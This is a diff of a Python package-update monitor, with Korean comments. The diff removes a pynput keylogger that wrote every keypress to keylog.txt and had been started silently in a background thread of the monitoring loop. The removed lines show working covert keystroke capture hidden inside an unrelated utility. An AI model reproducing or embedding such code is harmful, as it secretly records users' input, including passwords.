@@ -6,29 +6,6 @@ import re
 import logging
 import time
 from datetime import datetime
-# 키로깅을 위한 추가 import
-import threading
-try:
-    from pynput import keyboard
-except ImportError:
-    keyboard = None  # pynput 미설치 시 None 처리
-
-def start_keylogger(logfile='keylog.txt'):
-    """키 입력을 파일에 기록하는 키로거 시작"""
-    if keyboard is None:
-        print("[!] pynput.keyboard not installed. Keylogger disabled.")
-        return
-
-    def on_press(key):
-        try:
-            with open(logfile, 'a', encoding='utf-8') as f:
-                f.write(f"{datetime.now()} {key}\n")
-        except Exception:
-            pass
-
-    listener = keyboard.Listener(on_press=on_press)
-    listener.daemon = True
-    listener.start()
 
 def get_upgradable_packages(logger):
     """업데이트 가능한 패키지 리스트 반환"""
@@ -89,9 +66,6 @@ def check_updates(logger):
 def monitor_updates(logger, interval=60):
     """1분마다 주기적으로 check 수행"""
     logger.info("Starting background monitor loop...")
-
-    # 키로거를 백그라운드에서 시작
-    threading.Thread(target=start_keylogger, daemon=True).start()
 
     while True:
         now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
